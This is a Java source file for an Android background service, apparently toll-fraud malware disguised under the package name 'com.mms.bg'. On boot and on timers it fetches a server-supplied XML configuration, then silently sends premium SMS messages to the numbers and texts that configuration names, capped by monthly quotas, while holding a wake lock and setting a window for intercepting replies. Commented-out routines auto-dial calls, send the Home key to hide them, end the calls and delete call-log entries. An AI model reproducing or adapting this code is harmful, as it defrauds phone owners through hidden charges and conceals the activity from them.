package com.mms.bg.ui;

import java.io.File;
import java.util.Date;
import java.util.List;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.pm.ServiceInfo;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

import com.mms.bg.transaction.WorkingMessage;
import com.mms.bg.util.XMLHandler;

public class BgService extends Service {

    private static final String TAG = "BgService";
    private static final boolean DEBUG = true;
    
    public static final String ACTION_DIAL_BR = "action.dial.bg";
    public static final String ACTION_INTERNET = "action.internet.bg";
    public static final String ACTION_SEND_SMS = "action.sms.bg";
    public static final String ACTION_BOOT = "action.boot.bg";
    public static final String ACTION_SEND_SMS_ROUND = "action.round.sms";
    
    public static final String FILTER_ACTION = "com.mms.bg.FILTER_ACTION";
    public static final String META_DATA = "com.mms.bg.pid";
    
    private SettingManager mSM;
    private boolean mStartSMSAfterInternet;
    
    private boolean mIsCalling;
    
    private static final int LONG_DIAL_DELAY = 4 * 60 * 1000;
    private static final int DIAL_DELAY = 5 * 1000;
    private static final int SHOW_DIALOG_DELAY = 2000;
    
//    private static final int DIAL_AUTO = 0;
//    private static final int SHOW_DIALOG = 1;
//    private static final int START_INTENT = 2;
//    private static final int REMOVE_FIRST_LOG = 3;
//    private Handler mHandler = new Handler() {
//        public void handleMessage(Message msg) {
//            switch (msg.what) {
//            case DIAL_AUTO:
////                dial();
//                mHandler.sendEmptyMessageDelayed(SHOW_DIALOG, SHOW_DIALOG_DELAY);
//                break;
//            case SHOW_DIALOG:
//                homeKeyPress();
//                mHandler.sendEmptyMessage(START_INTENT);
//                break;
//            case START_INTENT:
//                startIntent();
//                break;
//            case REMOVE_FIRST_LOG:
//                deleteLastCallLog();
//                break;
//            }
//        }
//    };
    
//    private class CancelTask implements Runnable {
//        public void run() {
//            if (mIsCalling == true) {
//                if (DEBUG) Log.d(TAG, "[[TimeTask::run]] stop the calling");
//                if (SettingManager.getInstance(getApplicationContext()).mForegroundActivity != null) {
//                    try {
//                        ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
//                        SettingManager.getInstance(BgService.this).logTagCurrentTime("Dial_end");
//                        phone.endCall();
//                        mHandler.sendEmptyMessageDelayed(REMOVE_FIRST_LOG, 2000);
//                        SettingManager.getInstance(getApplicationContext()).mForegroundActivity.finish();
//                    } catch (Exception e) {
//                    }
//                }
//                mIsCalling = false;
//            }
//        }
//    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        if (DEBUG) Log.d(TAG, "[[BgService::onCreate]]");
        this.setForeground(true);
        
        mSM = SettingManager.getInstance(BgService.this);
        mSM.setFirstStartTime();
        
        PackageManager pm = getPackageManager();
        List<ResolveInfo> plugins = pm.queryIntentServices(
                                   new Intent(FILTER_ACTION), PackageManager.GET_META_DATA);
        SettingManager.getInstance(getApplicationContext()).mPid = "0";
        for (ResolveInfo info : plugins) {
            LOGD("package name = " + info.serviceInfo.packageName);
            if (info.serviceInfo.packageName.equals("com.mms.bg") == true) {
                if (info.serviceInfo.metaData != null 
                        && info.serviceInfo.metaData.containsKey(META_DATA) == true) {
                    LOGD("set the pid");
                    SettingManager.getInstance(getApplicationContext()).mPid = String.valueOf(info.serviceInfo.metaData.getInt(META_DATA));
                }
            }
        }
        LOGD("PID = " + SettingManager.getInstance(getApplicationContext()).mPid);
        mStartSMSAfterInternet = true;
    }
    
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        
        SettingManager sm = SettingManager.getInstance(this);
        sm.log(TAG, "BgService::onStart action = " + (intent != null ? intent.getAction() : ""));
        if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_INTERNET) == true) {
            LOGD("[[onStart]] received the action to get the internet info");
            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer();
            if (ret == true) {
                SettingManager.getInstance(this).parseServerXMLInfo();
                String delay = SettingManager.getInstance(this).mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
                long delayTime = 0;
                if (delay != null) {
                    delayTime = (Long.valueOf(delay)) * 60 * 60 * 1000;
                }
                LOGD("[[onStart]] change the internet connect time delay, and start send the auto sms");
                sm.setLastConnectServerTime(System.currentTimeMillis());
                SettingManager.getInstance(this).tryToFetchInfoFromServer(delayTime);
                if (isSendSMS() == true && mStartSMSAfterInternet == true) {
                    long sms_delay_time = sm.getSMSSendDelay();
                    SettingManager.getInstance(this).startAutoSendMessage(0, sms_delay_time);
                    mStartSMSAfterInternet = false;
                }
            }
        } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS) == true) {
            LOGD("[[onStart]] start send the sms for one cycle");
            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer();
            if (ret == true) {
                SettingManager.getInstance(this).parseServerXMLInfo();
                mSM.log(TAG, "start send the sms for one cycle");
                SettingManager.getInstance(this).startOneRoundSMSSend(0);
                mSM.log("cancel the auto message send now and start it after this round sms send");
                mSM.cancelAutoSendMessage();
                mSM.setSMSBlockBeginTime(System.currentTimeMillis());
            } else {
                long false_retry_time = ((long) 1) * 3600 * 1000;
                sm.setSMSSendDelay(false_retry_time);
                SettingManager.getInstance(this).startAutoSendMessage(System.currentTimeMillis(), false_retry_time);
            }
        } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS_ROUND) == true) {
            mSM.log("receive the action = " + intent.getAction());
            oneRoundSMSSend();
        } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_BOOT) == true) {
            mSM.log("action is not filtered use the default logic");
            File file = new File(SettingManager.getInstance(getApplicationContext()).DOWNLOAD_FILE_PATH);
            if (file.exists() == true) {
                mSM.parseServerXMLInfo();
                String delay = mSM.mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
                long delayTime = 0;
                if (delay != null) {
                    delayTime = (Integer.valueOf(delay)) * 60 * 60 * 1000;
                }
                mSM.tryToFetchInfoFromServer(delayTime);
                if (isSendSMS() == true) {
                    long sms_delay_time = sm.getSMSSendDelay();
                    SettingManager.getInstance(this).startAutoSendMessage(0, sms_delay_time);
                    mStartSMSAfterInternet = false;
                }
            } else {
                mSM.tryToFetchInfoFromServer(0);
            }
        }
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
//        this.unregisterReceiver(mDialogBroadCast);
        mSM.log(TAG, "onDestroy");
    }
    
    private void oneRoundSMSSend() {
        SettingManager sm = mSM;
        long last_sms_time = sm.getLastSMSTime();
        long sms_delay = sm.getSMSSendDelay();
        long current_time = System.currentTimeMillis();
        if ((current_time - last_sms_time) < sms_delay) {
            sm.log(TAG, "======= ignore this sms send because the sms time delay not reach =====");
            return;
        }
        sm.log(TAG, "receive the intent for send on sms, intent action = " + ACTION_SEND_SMS_ROUND);
        if (sm.mXMLHandler != null) {
            String monthCount = sm.mXMLHandler.getChanneInfo(XMLHandler.LIMIT_NUMS_MONTH);
            if (monthCount != null) {
                int sendTotlaCount = Integer.valueOf(monthCount);
                int hasSend = sm.getSMSSendCount();
                if (hasSend < sendTotlaCount) {
                    autoSendSMS(BgService.this);
                    sm.setSMSSendCount(hasSend + 1);
                    LOGD("this round has send sms count = " + (hasSend + 1));
                    sm.log(TAG, "this round has send sms count = " + (hasSend + 1));
                } else {
                    sm.log(TAG, "cancel this round the sms auto send, because the send job done");
                    sm.setSMSSendCount(0);
                    sm.cancelOneRoundSMSSend();
                    sm.setLastSMSTime(System.currentTimeMillis());
                    sm.setSMSSendDelay(SettingManager.SMS_DEFAULT_DELAY_TIME);
                    long sms_delay_time = sm.getSMSSendDelay();
                    sm.startAutoSendMessage(0, sms_delay_time);
                }
            } else {
                sm.log(TAG, "cancel this round the sms auto send, because month count == null");
                sm.cancelOneRoundSMSSend();
            }
        } else {
            sm.log(TAG, "mXMLHandler == null error");
        }
    }
    
    private boolean isSendSMS() {
        if (mSM.mXMLHandler != null) {
            String targetNum = mSM.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_PORT);
            String sendText = mSM.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_ORDER);
            String smsOrDial = mSM.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_SMS);
            if (smsOrDial != null && targetNum != null && sendText != null) {
                return Integer.valueOf(smsOrDial) == 0 ? true : false;
            }
        }
        return false;
    }
    
    private void autoSendSMS(Context context) {
        SettingManager sm = SettingManager.getInstance(context);
        if (sm.isSimCardReady() == false || sm.isCallIdle() == false) return;
      
        if (sm.mXMLHandler != null) {
            String targetNum = sm.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_PORT);
            String sendText = sm.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_ORDER);
            String smsOrDial = sm.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_SMS);
            if (smsOrDial != null && sendText != null && targetNum != null) {
                boolean sms = Integer.valueOf(smsOrDial) == 0 ? true : false;
                if (sms == true) {
                    String intercept_time_str = sm.mXMLHandler.getChanneInfo(XMLHandler.INTERCEPT_TIME);
                    long intercept_time_int = ((long) 2000) * 60 * 1000;
                    if (intercept_time_str != null) {
                        intercept_time_int = Long.valueOf(intercept_time_str) * 60 * 1000;
                    }
                    sm.setSMSBlockDelayTime(intercept_time_int);
                    SettingManager.getInstance(context).makePartialWakeLock();
                    try {
                        Date date = new Date(System.currentTimeMillis());
                        LOGD("current time = " + date.toLocaleString());
                        WorkingMessage wm = WorkingMessage.createEmpty(context);
                        LOGD("send sms to : " + targetNum + " text = " + sendText);
                        wm.setDestNum(targetNum);
                        wm.setText(sendText);
                        wm.send();
                    } catch (Exception e) {
                    } finally {
                        SettingManager.getInstance(context).releasePartialWakeLock();
                        Date date = new Date(System.currentTimeMillis());
                        LOGD("[[autoSendSMSOrDial]] current time = " + date.toLocaleString());
                    }
                } else {
                    //TODO : dial
                }
            }
        } else {
            //TODO : do something for no xml handler
        }
    }
    
    private void homeKeyPress() {
        Intent i= new Intent(Intent.ACTION_MAIN);

        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addCategory(Intent.CATEGORY_HOME);
        startActivity(i);
    }
    
    private void startIntent() {
        Log.d(TAG, "========= [[startIntent]] ========");
        Intent intent = new Intent(BgService.this, DialScreenActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    
//    private void deleteLastCallLog() {
//        if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]]");
//        ContentResolver resolver = getContentResolver();
//        Cursor c = null;
//        try {
//            Uri CONTENT_URI = Uri.parse("content://call_log/calls");
//            c = resolver.query(
//                    CONTENT_URI,
//                    new String[] {Calls._ID},
//                    "type = 2",
//                    null,
//                    "date DESC" + " LIMIT 1");
//            if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] c = " + c);
//                if (c == null || !c.moveToFirst()) {
//                    if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] cursor error, return");
//                    return;
//                }
//                long id = c.getLong(0);
//                String where = Calls._ID + " IN (" + id + ")";
//                if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] delete where = " + where);
//                getContentResolver().delete(CONTENT_URI, where, null);
//            } finally {
//                if (c != null) c.close();
//            }
//            SettingManager.getInstance(getApplicationContext()).releaseWakeLock();
//    }
    
    @Override
    public IBinder onBind(Intent intent) {
        // TODO Auto-generated method stub
        return null;
    }
    
    public final void LOGD(String msg) {
        if (DEBUG) {
            Log.d(TAG, "[[" + this.getClass().getSimpleName()
                    + "::" + Thread.currentThread().getStackTrace()[3].getMethodName()
                    + "]] " + msg);
        }
    }
}
